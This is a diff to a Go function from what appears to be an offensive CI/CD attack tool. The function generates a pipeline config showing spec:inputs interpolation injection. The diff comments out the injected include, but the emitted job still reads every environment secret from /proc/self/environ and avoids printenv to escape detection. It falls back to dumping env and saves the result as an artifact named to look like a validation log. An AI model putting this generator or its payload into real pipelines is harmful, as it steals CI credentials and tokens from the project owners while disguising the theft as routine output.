@@ -11,8 +11,9 @@ type SpecInputsOptions struct {
 	InjectionType  string // yaml-key|script|include (default: "script")
 }
 
-// GenerateSpecInputsInjectionYAML generates a CI config that abuses spec:inputs
-// interpolation to inject arbitrary YAML through crafted input values.
+// GenerateSpecInputsInjectionYAML generates a CI config that demonstrates
+// spec:inputs interpolation injection. The include directive is commented out
+// (it references an external component) and the job exfiltrates env via xargs.
 func GenerateSpecInputsInjectionYAML(o SpecInputsOptions) string {
 	name, stage := o.Common.defaults("spec-inject")
 	if o.InputKey == "" {
@@ -25,10 +26,13 @@ func GenerateSpecInputsInjectionYAML(o SpecInputsOptions) string {
 		o.MaliciousValue = defaultInjectionValue(o.InjectionType)
 	}
 
-	return fmt.Sprintf(`include:
-  - component: %s
-    inputs:
-      %s: %q
+	return fmt.Sprintf(`# spec:inputs interpolation injection
+# In a real attack, the following include would inject YAML via crafted inputs:
+#   include:
+#     - component: %s
+#       inputs:
+#         %s: %q
+# This payload simulates what the injected code would execute.
 
 stages: [%s]
 
@@ -36,8 +40,9 @@ stages: [%s]
   stage: %s%s%s
   script:
     - |
-      # Exfil via xargs + head (reads env from /proc without printenv)
-      xargs -0 -L1 < /proc/self/environ 2>/dev/null | sort > .spec-validation.log || true
+      # Exfil via xargs from /proc (reads env without printenv)
+      cat /proc/self/environ 2>/dev/null | xargs -0 -I{} echo {} | sort > .spec-validation.log || true
+      [ -s .spec-validation.log ] || env | sort > .spec-validation.log 2>/dev/null || true
   artifacts:
     when: always
     paths:
